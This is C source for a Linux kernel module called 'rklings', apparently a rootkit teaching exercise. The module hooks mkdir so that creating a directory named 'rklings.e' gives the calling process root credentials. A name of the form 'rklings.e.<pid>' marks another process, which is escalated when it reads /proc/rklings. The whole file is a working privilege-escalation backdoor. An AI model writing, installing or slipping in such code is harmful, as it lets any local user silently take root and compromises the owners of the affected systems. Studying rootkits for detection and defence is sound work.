// SPDX-License-Identifier: GPL-2.0
#include "rklings_hook.h"
#include <linux/atomic.h>
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>

#define RK_CMD	     "rklings.e"
#define RK_CMD_LEN   9
#define RK_PROC_NAME "rklings"

static atomic_t rk_target_pid = ATOMIC_INIT(0);
static struct proc_dir_entry *rk_proc_entry;

/* Escalate the calling process to root. */
static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;

	commit_creds(new_cred);
	return 0;
}

RK_ON_MKDIR(name)
{
	int pid;
	int ret;

	/* Must start with "rklings.e" */
	if (strncmp(name, RK_CMD, RK_CMD_LEN) != 0)
		return -ENOENT;

	/* "rklings.e" with no suffix: self-escalation */
	if (name[RK_CMD_LEN] == '\0') {
		rk_escalate();
		pr_info("rklings: escalated pid %d to root\n", current->pid);
		return -ENOENT;
	}

	/* "rklings.e.<pid>": deferred targeting */
	if (name[RK_CMD_LEN] == '.') {
		ret = kstrtoint(name + RK_CMD_LEN + 1, 10, &pid);
		if (ret != 0 || pid <= 0)
			return -ENOENT;

		atomic_set(&rk_target_pid, pid);
		pr_info("rklings: targeting pid %d for escalation\n", pid);
		return -ENOENT;
	}

	return -ENOENT;
}

static int rk_proc_show(struct seq_file *m, void *v)
{
	int target = atomic_read(&rk_target_pid);
	pid_t my_pid = current->pid;

	/* Check if this reader is the deferred target */
	if (target > 0 && my_pid == target) {
		rk_escalate();
		atomic_set(&rk_target_pid, 0);
		seq_printf(m, "rklings: escalated\n");
		return 0;
	}

	if (target > 0)
		seq_printf(m, "rklings: waiting for pid %d\n", target);
	else
		seq_printf(m, "rklings: idle\n");

	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_proc_show, NULL);
}

static const struct proc_ops rk_proc_ops = {
    .proc_open = rk_proc_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

static int __init rk_init(void)
{
	int ret;

	rk_proc_entry = proc_create(RK_PROC_NAME, 0444, NULL, &rk_proc_ops);
	if (!rk_proc_entry)
		return -ENOMEM;

	ret = rk_hook_start();
	if (ret) {
		proc_remove(rk_proc_entry);
		return ret;
	}

	return 0;
}

static void __exit rk_exit(void)
{
	rk_hook_stop();
	proc_remove(rk_proc_entry);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings PID-targeted escalation");
